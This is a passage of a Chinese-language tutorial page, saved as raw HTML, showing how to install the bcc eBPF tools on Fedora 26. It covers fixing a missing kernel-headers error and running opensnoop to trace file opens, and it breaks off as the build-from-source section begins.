class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc06019736151-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc06019736151-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc06019736151-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc06019736151-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc06019736151-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc06019736151-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc06019736151-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc06019736151-1\"><span class=\"crayon-p\"># echo -e '[iovisor]\\nbaseurl=https://repo.iovisor.org/yum/nightly/f25/$basearch\\nenabled=1\\ngpgcheck=0' | sudo tee /etc/yum.repos.d/iovisor.repo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc06019736151-2\"><span class=\"crayon-p\"># dnf install bcc-tools</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc06019736151-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc06019736151-4\"><span class=\"crayon-e\">Total </span><span class=\"crayon-e\">download </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">37</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc06019736151-5\"><span class=\"crayon-e\">Installed </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">143</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc06019736151-6\"><span class=\"crayon-st\">Is</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ok</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">y</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc06019736151-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>安装完成后，您可以在 <code>/usr/share</code> 中看到新的工具：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc0a616513801\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ls /usr/share/bcc/tools/\r\nargdist       dcsnoop              killsnoop       softirqs    trace\r\nbashreadline  dcstat               llcstat         solisten    ttysnoop\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0a616513801-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0a616513801-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0a616513801-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0a616513801-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0a616513801-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0a616513801-1\"><span class=\"crayon-p\"># ls /usr/share/bcc/tools/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0a616513801-2\"><span class=\"crayon-e\">argdist       </span><span class=\"crayon-e\">dcsnoop              </span><span class=\"crayon-e\">killsnoop       </span><span class=\"crayon-e\">softirqs    </span><span class=\"crayon-e\">trace</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0a616513801-3\"><span class=\"crayon-e\">bashreadline  </span><span class=\"crayon-e\">dcstat               </span><span class=\"crayon-e\">llcstat         </span><span class=\"crayon-e\">solisten    </span><span class=\"crayon-i\">ttysnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0a616513801-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0a616513801-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>试着运行其中一个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc0d098480340\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nchdir(/lib/modules/4.11.8-300.fc26.x86_64/build): No such file or directory\r\nTraceback (most recent call last):\r\n  File \"/usr/share/bcc/tools/opensnoop\", line 126, in \r\n    b = BPF(text=bpf_text)\r\n  File \"/usr/lib/python3.6/site-packages/bcc/__init__.py\", line 284, in __init__\r\n    raise Exception(\"Failed to compile BPF module %s\" % src_file)\r\nException: Failed to compile BPF module\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0d098480340-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0d098480340-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0d098480340-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0d098480340-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0d098480340-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0d098480340-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0d098480340-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc0d098480340-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc0d098480340-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0d098480340-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0d098480340-2\"><span class=\"crayon-e\">chdir</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">modules</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4.11.8</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">300.fc26.x86_64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">build</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">No </span><span class=\"crayon-e\">such </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">directory</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0d098480340-3\"><span class=\"crayon-e\">Traceback</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">most </span><span class=\"crayon-e\">recent </span><span class=\"crayon-e\">call </span><span class=\"crayon-v\">last</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0d098480340-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/usr/share/bcc/tools/opensnoop\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">126</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0d098480340-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BPF</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">text</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">bpf_text</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0d098480340-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/usr/lib/python3.6/site-packages/bcc/__init__.py\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">284</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__init__</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0d098480340-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">raise </span><span class=\"crayon-e\">Exception</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Failed to compile BPF module %s\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">src_file</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc0d098480340-8\"><span class=\"crayon-v\">Exception</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Failed </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compile </span><span class=\"crayon-e\">BPF </span><span class=\"crayon-i\">module</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc0d098480340-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>运行失败，提示 <code>/lib/modules/4.11.8-300.fc26.x86_64/build</code> 丢失。 如果你也遇到这个问题，那只是因为系统缺少内核头文件。 如果你看看这个文件指向什么（这是一个符号链接），然后使用 <code>dnf whatprovides</code> 来搜索它，它会告诉你接下来需要安装的包。 对于这个系统，它是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc18254898458\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# dnf install kernel-devel-4.11.8-300.fc26.x86_64\r\n[...]\r\nTotal download size: 20 M\r\nInstalled size: 63 M\r\nIs this ok [y/N]: y\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc18254898458-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc18254898458-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc18254898458-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc18254898458-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc18254898458-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc18254898458-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc18254898458-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc18254898458-1\"><span class=\"crayon-p\"># dnf install kernel-devel-4.11.8-300.fc26.x86_64</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc18254898458-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc18254898458-3\"><span class=\"crayon-e\">Total </span><span class=\"crayon-e\">download </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc18254898458-4\"><span class=\"crayon-e\">Installed </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc18254898458-5\"><span class=\"crayon-st\">Is</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ok</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">y</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc18254898458-6\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc18254898458-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>现在：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc1c622151515\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n11792  ls                  3   0 /etc/ld.so.cache\r\n11792  ls                  3   0 /lib64/libselinux.so.1\r\n11792  ls                  3   0 /lib64/libcap.so.2\r\n11792  ls                  3   0 /lib64/libc.so.6\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc1c622151515-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc1c622151515-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc1c622151515-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc1c622151515-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc1c622151515-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc1c622151515-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cc1c622151515-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cc1c622151515-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc1c622151515-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc1c622151515-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc1c622151515-3\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ld</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">cache</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc1c622151515-4\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libselinux</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc1c622151515-5\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libcap</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc1c622151515-6\"><span class=\"crayon-cn\">11792</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\">                  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libc</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">so</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">6</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cc1c622151515-7\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cc1c622151515-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>运行起来了。 这是捕获自另一个窗口中的 ls 命令活动。 请参阅前面的部分以使用其它有用的命令。</p>\n<h3 id=\"toc_10\">通过源码安装</h3>\n<p>如果您需要从源代码安装，您还可以在 <a href=\"https://github.com/iovisor/bcc/blob/master/INSTALL.md#fedora---source\">INSTALL.md</a> 中找到文档和更新说明。 我在 Fedora 26 上做了如下的事情：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cc20349350031\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; 